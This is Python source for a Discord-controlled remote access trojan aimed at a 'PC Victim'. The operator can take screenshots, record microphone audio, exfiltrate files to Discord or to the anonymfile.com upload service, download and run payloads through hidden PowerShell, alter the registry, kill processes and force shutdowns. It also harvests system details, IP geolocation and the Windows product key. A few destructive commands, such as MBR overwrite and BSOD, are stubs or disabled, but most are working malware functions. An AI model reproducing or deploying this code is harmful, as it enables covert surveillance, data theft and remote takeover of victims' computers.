__import__('sys').path.append('../')
import discord, asyncio, os, subprocess, requests, psutil, json, win32api, win32con, threading
import sounddevice as sd
from PIL import ImageGrab
from core.info import Info
from core.sender import Sender
from discord.ext import commands
from urllib.parse import urlparse
from pretty_help import PrettyHelp
from scipy.io.wavfile import write
from pynput import keyboard, mouse
from core.destroy_window import DestroyWindow

os.system('cls')
pc = Info()
PREFIX = '>'
client = commands.Bot(command_prefix=commands.when_mentioned_or(PREFIX), intents = discord.Intents.all(), help_command=PrettyHelp())

def CheckHWID(HWID):
	if HWID == pc.HWID():
		return True
	else:
		return False

async def SendOutput(ctx, output):
	output_embed = discord.Embed(description=f'**__Output__**\n```\n{output}\n```')
	await ctx.send(embed = output_embed)

async def safe(ctx):
	if True:
		await SendOutput(ctx, "This Feature has been disabled for the safety of Dev")
		return

class Destroy(commands.Cog, description='Destory PC Victim'):
	@commands.command(aliases=["mbr"], brief='MBR Overwrite', description='MBR Overwrite')
	async def MBROverwrite(self, ctx, HWID: str, ):
		if not CheckHWID(HWID):
			return
		# DestroyWindow.MBROverwrite()

	@commands.command(aliases=["bsod"], brief='Blue Screen Of Death', description='Blue Screen Of Death')
	async def BSOD(self, ctx, HWID: str, method, ):
		if not CheckHWID(HWID):
			return

	@commands.command(aliases=["regdelete"], brief='Delete HKCU and HKLM/System', description='Delete HKCU and HKLM/System')
	async def RegistryDelete(self, ctx, HWID: str, ):
		if not CheckHWID(HWID):
			return

class Control(commands.Cog, description='Control PC Victim'):

	def __init__(self):
		self.keyboard_listener = keyboard.Listener(suppress=True, on_press=self.on_press, on_release=self.on_release)
		self.mouse_listener = mouse.Listener(suppress=True, on_press=self.on_press, on_release=self.on_release)

	def on_press(self, key):
		pass

	def on_release(self, key):
		pass

	@commands.command(aliases=['reg'], brief='Control Registry', description='Control Registry')
	async def Registry(self, ctx, HWID: str, method: str, path: str, ):
		await safe(ctx)
		if not CheckHWID(HWID):
			return
		output = str(subprocess.check_output(f'reg {method} {path} /f', shell=True), 'utf-8')
		await SendOutput(ctx, output)

	@commands.command(aliases=['tkill', 'tk'], brief='End Processes by Process Name', description='End Processes by Process Name')
	async def Taskkill(self, ctx, HWID: str, Name: str, ):
		await safe(ctx)
		if not CheckHWID(HWID):
			return
		output = str(subprocess.check_output(f'taskkill /f /im {Name}', shell=True), 'utf-8')
		await SendOutput(ctx, output)

	@commands.command(aliases=['tlist', 'tl'], brief='List All Processes Running on PC Victim', description='List All Processes Running on PC Victim')
	async def Tasklist(self, ctx, HWID: str, ):
		await safe(ctx)
		if not CheckHWID(HWID):
			return
		processes = ''
		for proc in psutil.process_iter():
			try:
				processName = proc.name()
				processID = proc.pid
				processes += f"{processName} - {processID}\n"
				if len(processes.split('\n')) == 40:
					await SendOutput(ctx, processes)
					processes = ''
			except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
				pass
		await SendOutput(ctx, processes)

	@commands.command(aliases=['sc', 's'], brief='Screenshot PC Victim', description='Screenshot PC Victim')
	async def Screenshot(self, ctx, HWID: str, ) -> None:
		if not CheckHWID(HWID):
			return
		snapshot = ImageGrab.grab()
		image_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\sc.jpg"
		snapshot.save(image_path)
		file = discord.File(image_path, filename="sc.png")
		await ctx.send(content = '', file=file)

	@commands.command(aliases=["up", "u"], brief='Upload File to PC Victim', description='Upload File to PC Victim')
	async def Upload(self, ctx, HWID: str, url: str, path_file: str = '.',):
		if not CheckHWID(HWID):
			return
		response = requests.get(url)
		parse = urlparse(url)
		filename = os.path.basename(parse.path)
		open(f'{path_file}/{filename}', "wb").write(response.content)
		await SendOutput(ctx, f"Uploaded File {path_file}/{filename}")

	@commands.command(aliases=["down", "d"], brief='Download File From PC Victim', description='Download File From PC Victim')
	async def Download(self, ctx, HWID: str, path_file: str = '.',):
		if not CheckHWID(HWID):
			return
		if not os.path.exists(path_file):
			await SendOutput(ctx, f"Not Found File {path_file}")
			return
		if os.path.getsize(path_file) < 25000000:
			filename = os.path.basename(path_file)
			file = discord.File(path_file, filename=filename)
			await SendOutput(ctx, f"Upload File {filename} Success")
			await ctx.send(file=file)
		else:
			filename = os.path.basename(path_file)
			file = {"file": open(path_file, 'rb')}
			r = requests.post('https://anonymfile.com/api/v1/upload', files=file)
			json_r = json.loads(r.text)
			if not json_r['status']:
				await SendOutput(ctx, f"Upload File {path_file} To Anonymfile Failed")
				return
			url_file = json_r['data']['file']['url']['full']
			await SendOutput(ctx, f"Upload File {filename} To Anonymfile Success\nUrl File: {url_file}")

	@commands.command(aliases=["run", "r"], brief='Run File From PC Victim', description='Run File From PC Victim')
	async def Run(self, ctx, HWID: str,  method = 'cmd', path_file: str = '.'):
		# await safe(ctx)
		if not CheckHWID(HWID):
			return

		def subp(method):
			if method == 'cmd':
				output = str(subprocess.check_output(f'cmd /c {path_file}', shell=True), 'utf-8')
				# await SendOutput(ctx, output)
			elif method == 'powershell':
				output = str(subprocess.check_output(f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {path_file} -Wait"', shell=True), 'utf-8')
				# await SendOutput(ctx, output)
		threading.Thread(target = subp, args=(method,)).start()
		await SendOutput(ctx, 'Run Done!\n')

	@commands.command(aliases=["msgbox", "mbox"], brief='Message Box To PC Victim', description='Message Box To PC Victim')
	async def MessageBox(self, ctx, HWID: str, method = 'msg', amount: int = 1, caption: str = 'Lol', *, message):
		if not CheckHWID(HWID):
			return
		def msg(amount, method, message):
			for i in range(amount):
				if method == 'msg':
					output = str(subprocess.check_output(f'cmd /c msg * {message}', shell=True), 'utf-8')	
				elif method == 'msgbox':
					win32api.MessageBox(win32con.NULL, message, caption)	
		threading.Thread(target = msg, args = (amount, method, message, )).start()
		await SendOutput(ctx, "Done!")

	@commands.command(aliases=["shutdown", "sd"], brief='Shutdown PC Victim', description='Shutdown PC Victim')
	async def Shutdown(self, ctx, HWID: str):
		if not CheckHWID(HWID):
			return
		output = str(subprocess.check_output('shutdown /f /t 0', shell=True), 'utf-8')

	@commands.command(aliases=["restart", "rstart"], brief='Restart PC Victim', description='Restart PC Victim')
	async def Restart(self, ctx, HWID: str):
		if not CheckHWID(HWID):
			return
		output = str(subprocess.check_output('shutdown /f /r /t 0', shell=True), 'utf-8')

	@commands.command(aliases=["signout", "sout"], brief='Sign Out PC Victim', description='Logout PC Victim')
	async def SignOut(self, ctx, HWID: str):
		if not CheckHWID(HWID):
			return
		output = str(subprocess.check_output('shutdown /l', shell=True), 'utf-8')

	@commands.command(aliases=["blockinput", "binput"], brief='Block Keyboard and Mouse', description='Block Keyboard and Mouse')
	async def BlockInput(self, ctx, HWID: str):
		await safe(ctx)
		if not CheckHWID(HWID):
			return
		kb_th = threading.Thread(target = self.keyboard_listener.start)
		ms_th = threading.Thread(target = self.mouse_listener.start)
		kb_th.start()
		ms_th.start()
		kb_th.join()
		ms_th.join()
		await SendOutput(ctx, 'Input has been blocked!')

	@commands.command(aliases=["unblockinput", "ubinput"], brief='Unblock Keyboard and Mouse', description='Unblock Keyboard and Mouse')
	async def UnblockInput(self, ctx, HWID: str):
		await safe(ctx)
		if not CheckHWID(HWID):
			return
		self.keyboard_listener.stop()
		self.mouse_listener.stop()

		await SendOutput(ctx, 'Input has been unblocked!')

	@commands.command(aliases=["kboard", "kb"], brief='Control Keyboard PC Victim', description='Control Keyboard PC Victim')
	async def Keyboard(self, ctx, HWID: str, mode: str = 'type',  *, text = ''):
		if not CheckHWID(HWID):
			return

	@commands.command(aliases=["mouse", "mse"], brief='Control Mouse PC Victim', description='Control Mouse PC Victim')
	async def Mouse(self, ctx, HWID: str, click_mode: str = 'r',  x = 0, y = 0):
		if not CheckHWID(HWID):
			return

	@commands.command(aliases=["sprocess", "sp"], brief='Start Process in PC Victim', description='Start Process in PC Victim')
	async def StartProcess(self, ctx, HWID: str, process = None, *, agruments):
		await safe(ctx)
		if not CheckHWID(HWID):
			return
		if process == None:
			return
		output = str(subprocess.check_output(f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {process} -ArgumentList \"{agruments}\" "'), 'utf-8')
		await SendOutput(ctx, output)

	@commands.command(aliases=["recordaudio", "raudio"], brief='Record Audio in PC Victim', description='Record Audio in PC Victim')
	async def RecordAudio(self, ctx, HWID: str, duration: int = 5):
		if not CheckHWID(HWID):
			return
		path_audio = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\rcad.wav"
		freq = 44100
		recording = sd.rec(int(duration * freq),
				   samplerate=freq, channels=2)
		await SendOutput(ctx, "Starting Recording")
		sd.wait()
		write(path_audio, freq, recording)
		await SendOutput(ctx, "Recording Success")
		if os.path.getsize(path_audio) < 25000000:
			filename = os.path.basename(path_audio)
			file = discord.File(path_audio, filename=filename)
			await SendOutput(ctx, f"Upload Audio {filename}")
			await ctx.send(file=file)
		else:
			filename = os.path.basename(path_audio)
			file = {"file": open(path_audio, 'rb')}
			r = requests.post('https://anonymfile.com/api/v1/upload', files=file)
			json_r = json.loads(r.text)
			if not json_r['status']:
				await SendOutput(ctx, f"Upload Audio {path_audio} To Anonymfile Failed")
				return
			url_file = json_r['data']['file']['url']['full']
			await SendOutput(ctx, f"Upload Audio {filename} To Anonymfile Success\nUrl Audio: {url_file}")

class OtherCommands(commands.Cog, description='Other Commands'):
	@commands.command(aliases=['list'], brief='List All Victim', description='List All Victim')
	async def List(self, ctx):
		vic = discord.Embed(title = f'Victim {pc.HostName()}', description = f'**__INFORMATION__**\n```autohotkey\nIP: {pc.IP()}\nHWID: {pc.HWID()}\n```')
		await ctx.send(embed = vic)

	@commands.command(aliases=["getinfo"], brief='Get Information of PC Victim', description='Get Information of PC Victim')
	async def GetInformation(self, ctx, HWID: str, ):
		if not CheckHWID(HWID):
			return
		information_embed = discord.Embed(description=f"**__System Info__**\n```autohotkey\nComputer Name: {pc.HostName()}\nComputer OS: {pc.OSPlatform()} {pc.OSVersion()}\nCPU: {pc.Processor()}\nMac Address: {pc.MacAddress()}\nHWID: {pc.HWID()}\nTotal Cores: {pc.TotalCores()}\nTotal RAM: {pc.TotalRAM()}\nProduct Key: {pc.WindowProductKey()}\n```\n**__IP Info__**```prolog\nIP: {pc.IP()}\nRegion: {pc.IPData()['region']}\nCountry: {pc.IPData()['country']}\nCity: {pc.IPData()['city']}\nOrg: {pc.IPData()['org']}\n```")
		await ctx.send(embed = information_embed)

@client.event
async def on_command_error(ctx, error):
	if isinstance(error, commands.MissingRequiredArgument):
		await ctx.send('Please pass in all requirements :rolling_eyes:.')
	if isinstance(error, commands.MissingPermissions):
		await ctx.send("You dont have the permissions :angry:")

@client.event
async def on_ready():
	invite_link = f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot"
	print(invite_link)
	await client.change_presence(activity=discord.Game(name= f"{PREFIX}help"))
	await client.add_cog(Destroy())
	await client.add_cog(Control())
	await client.add_cog(OtherCommands())

# client.run(')